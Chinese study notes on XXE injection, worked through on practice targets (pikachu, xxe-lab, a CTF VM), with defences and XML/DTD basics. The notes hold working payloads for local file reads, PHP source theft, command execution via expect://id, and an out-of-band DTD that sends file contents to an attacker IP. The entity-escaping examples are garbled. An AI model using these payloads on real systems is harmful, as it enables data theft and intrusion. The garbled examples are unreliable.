XXE漏洞全称XMLExternal Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。

###  **案例：文件读取（需要Apache >=5.4版本）**
http://localhost/pikachu/vul/xxe/xxe_1.php

准备xml脚本
```

<?xml version = "1.0"?>  
<!DOCTYPE ANY [  
<!ENTITY xxe SYSTEM "file:///C://Users//37622//Desktop//123.txt">  
]>
<foo>&xxe;</foo>
```

![[Pasted image 20241101125145.png]]


![[Pasted image 20241101125159.png]]




### **案例：内网探测（鸡肋）**
准备xml脚本
在域名下如果有个1.txt文件，可以显示出来，代表80端口可以访问

```
<?xml version = "1.0" encoding="UTF-8"?>  
<!DOCTYPE ANY [  
<!ENTITY xxe SYSTEM "http://192.168.163.177:80/1.txt">  
]>  
<x>&xxe;</x>
```

如上图，在pikachu执行

## 案例：执行命令（不演示，不常见）

在安装expect扩展的PHP环境里执行系统命令
```

<?xml version = "1.0"?>  
<!DOCTYPE ANY [  
<!ENTITY xxe SYSTEM "expect://id">  
]>  
<x>&xxe;</x>

```

https://www.php.net/manual/zh/wrappers.expect.php


### **案例：无回显**
修改\pikachu\vul\xxe\xxe_1.php
![[Pasted image 20241101133139.png]]

新建一个用于接受的php(虚拟机2003)
http://192.168.163.177:90/XXE/get.php

```
<?php  
$data = $_GET['file'];  
$myfile = fopen("file.txt","w+");  
fwrite($myfile,$data);  
fclose($myfile);  
?>

```

新建vil.dtd文件(虚拟机)
注意下面的地址不能是127.0.0.1，必须是被攻击的电脑能访问的ip
```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=C://Users//37622//Desktop//123.txt">  
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://192.168.163.177:90/XXE/get.php?file=%file;'>">  
%all;  
%send;

```



pikachu-xxe攻击脚本
```

<?xml version = "1.0"?>  
<!DOCTYPE ANY[  
<!ENTITY % dtd SYSTEM "http://192.168.163.177:90/XXE/vil.dtd">  
%dtd;]>

```





# 疑问解答：
##### **为什么需要引用DTD文件**
 因为在 DTD 的内部子集中，不允许在标记声明中引用参数实体。您必须使用外部 DTD，即单独的文件。
##### **all为什么要嵌套一层**
 因为在里面一层用到了%file;而XML解析不会解析同一层级的参数

##### &#x25 是什么？**
 就是%号，如果直接用%号会报错



# 靶场案例：xxe-lab
http://localhost/xxe-lab/php_xxe/index.html
1.登录，截取包burpSuite

![[Pasted image 20241101141938.png]]
![[Pasted image 20241101141928.png]]
2.尝试XXE漏洞
```
<!DOCTYPE ANY [  
<!ENTITY file SYSTEM "file:///C://Users//37622//Desktop//123.txt">  
]>  
<user><username>  
&file;  
</username><password>12313</password></user>
```



看到这样的结果，说明存在漏洞:
![[Pasted image 20241101142119.png]]

3.获取用户名密码

```
<!DOCTYPE ANY [  
<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=doLogin.php">  
]>  
<user><username>  
&file;  
</username><password>12313</password></user>
```

4、获取密码
![[Pasted image 20241101144736.png]]



# **综合案例XXE-Ubuntu**

nmap 192.168.244.1/24

7kbscan:
![[Pasted image 20241101151115.png]]

http://192.168.163.165/robots.txt
http://192.168.163.165/index.html
![[Pasted image 20241101151339.png]]



XXE漏洞探测
访问[http://192.168.244.3/xxe/#](http://192.168.244.3/xxe/#) 让你登录，但不知道用户，密码


获取用户名密码
获得XXE.php内容
```
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE ANY [  
<!ENTITY  file SYSTEM "php://filter/read=convert.base64-encode/resource=xxe.php">  
]>  
<root><name>  
&file;  
</name><password>123213</password></root>
```
页面失效，下面burp试试admin.php
获得admin.php内容
http://192.168.244.3/xxe/admin.php
跳转flagmeout.php失败，burp试试flagmeout.php
http://192.168.244.3/xxe/flagmeout.php
成功获取flag!



# **CMS漏洞分析**
案例:phpsheCMS
![[Pasted image 20241101154350.png]]


### ==**审计视角**==
==分析XML解析器设置，DOM,JDOM，DOM4J,SAX等方式对XML的解析设置==
==simplexml_load_string、asXML、simplexml_load_file、simplexml_import_dom==



# ==**XXE漏洞防御**==
防御手段：
1、打开PHP的libxml_disable_entity_loader(true),不允许加载外部实体。
2、过滤用户提交的XML数据，如ENTITY、SYSTEM。


==============================================================================================================================

1、XXE漏洞由XML文档引起。
2、发现漏洞：
抓包查看登录请求，发现登录的用户名和密码以XML格式进行传递，而服务器可以接受XML格式的信息，就表明可能存在XXE漏洞。








```
<?xml version = "1.0"?> 
<!DOCTYPE ANY [
<!ENTITY  file SYSTEM "php://filter/read=convert.base64-encode/resource=xxe.php">
]>
<root><name>  
&file;  
</name><password>123213</password></root>




<?xml version = "1.0"?>  <!DOCTYPE ANY [ 
<!ENTITY xxe SYSTEM "http://localhost/123.txt">  ]> 
<foo>&xxe;</foo>


<?xml version = "1.0"?>  
<!DOCTYPE ANY [  
<!ENTITY xxe SYSTEM "file:///C://Users//Administrator//Desktop//1.txt">  
]>
 <foo>&xxe;</foo>
```


==============================================================================================================================
# XML基础：

XML基本语法（）：
1. xml文档的后缀名 .xml
2. xml第一行必须定义为文档声明
3. xml文档中有且仅有一个根标签
4. 属性值必须使用引号(单双都可)引起来
5. 标签必须正确关闭6. xml标签名称区分大小写

```
<?xml version='1.0' ?>  
<users>  
  <user id='1'>  
    <name>zhangsan</name>  
    <age>23</age>  
    <gender>male</gender>  
  </user>  
  <user id='2'>  
    <name>lisi</name>  
    <age>24</age>  
    <gender>female</gender>  
  </user>  
</users>


```

创建验证代码：

```
<?php  
libxml_disable_entity_loader(false);  
$xmlfile = file_get_contents('php://input');  //获取文件内容
//添加异常处理
$dom = new DOMDocument();  
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);  
$creds = simplexml_import_dom($dom);  
header('Content-Type: text/html; charset=utf-8');  
echo $creds;  
?>
```
http://localhost/check.php
Post data:
```
<?xml version='1.0' ?>
<users>
  <user id='1'>
    <name>zhangsan</name>
    <age>23</age>
    <gender>male</gender>
  </user>
  <user id='2'>
    <name>lisi</name>
    <age>24</age>
    <gender>female</gender>
  </user>
</users>
```


check.php
```
<?php  
$xmlString = $_POST['xml'];  
libxml_use_internal_errors(true);  
$dom = new DOMDocument();  
$xmlFile = 'example.xml';  
file_put_contents($xmlFile, $xmlString);  
  
if ($dom->load('example.xml')) { // 加载XML文件  
    if (!$dom->validate()) { // 验证DTD  
        $errors = libxml_get_errors(); // 获取错误信息  
        foreach($errors as $error) {  
            echo "Error code: {$error->code}\n";  
            echo "Error message: {$error->message}\n";  
        }  
    } else {  
        echo 'Validation successful!';  
    }  
} else {  
    echo 'Failed to load XML file.';  
}  
?>
```


http://localhost/check.php
Post data:
```
<xml=<?xml version='1.0' ?>  
<!DOCTYPE users [  
  <!ELEMENT users ( user+)>  
  <!ELEMENT user ( name,age,gender )>  
  <!ATTLIST user id CDATA #REQUIRED>  
  <!ELEMENT name    (#PCDATA)>  
  <!ELEMENT age    (#PCDATA)>  
  <!ELEMENT gender (#PCDATA)>  
]>  
<users>  
  <user id='1'>  
    <name>zhangsan</name>  
    <age>23</age>  
    <gender>male</gender>  
  </user>  
  <user id='2'>  
    <name>lisi</name>  
    <age>24</age>  
    <gender>female</gender>  
  </user>  
</users>
```





### **元素的分类**

· <!ELEMENT element-name EMPTY>//空元素

· <!ELEMENT element-name (#PCDATA)>//文本元素

· <!ELEMENT element-name (e1,e2)>//混合元素

### **ATTLIST属性定义**

![[Pasted image 20241101133732.png]]

# **实体**

实体是用于定义**引用普通文本或特殊字符**的快捷方式的变量。

## **预定义实体**

|     |     |     |
| --- | --- | --- |
| <   | <   | 小于  |
| >   | >   | 大于  |
| &   | &   | 和号  |
| '   | '   | 省略号 |
| "   | "   | 引号  |


无法运行访问：
`<?xml version='1.0' ?>`  
`<users>`  
  `<user id='1'>`  
    `<name>zhangsan></name>`  
    `<age>23&</age>`  
    `<gender>male"</gender>`  
  `</user>`  
`</users>`


改成下面能正确运行

`<?xml version='1.0' ?>`  
`<users>`  
  `<user id='1'>`  
    `<name>zhangsan></name>`  
    `<age>23&</age>`  
    `<gender>male"</gender>`  
  `</user>`  
`</users>`


自定义实体xml：
`<?xml version='1.0' ?>`  
`<!DOCTYPE note[`  
`<!ELEMENT note (name)>`  
`<!ENTITY zhangsan "zs">`  
`]>`  
`<users>`  
  `<user id='1'>`  
    `<name>&zhangsan;</name>`  
    `<age>23</age>`  
    `<gender>male</gender>`  
  `</user>`  
`</users>`


## **参数实体**

只能在DOCTYPE里面使用的实体
01:

`<?xml  version="1.0" encoding="utf-8"?>`  
`<!DOCTYPE  ROOT [`  
     `<!ELEMENT ROOT (A|B)*>`  
     `<!ENTITY  % A_atrr SYSTEM "A.dtd">`  
     `<!ENTITY  % B_atrr SYSTEM "B.dtd">`  
     `%A_atrr;`  
     `%B_atrr;`  
`]>`  
`<ROOT>`  
     `<A>`  
         `<NAME_A>`  
             `I am A!`  
         `</NAME_A>`  
     `</A>`  
     `<B>`  
         `<NAME_B>`  
             `I am B;`  
         `</NAME_B>`  
     `</B>`  
`</ROOT>`  


02：

`<?xml  version="1.0" encoding="utf-8"?>`  
`<!ELEMENT  A (NAME_A)>`  
`<!ELEMENT  NAME_A (#PCDATA)>`  

`<?xml  version="1.0" encoding="utf-8"?>`  
`<!ELEMENT  B (NAME_B)>`  
`<!ELEMENT  NAME_B (#PCDATA)>`






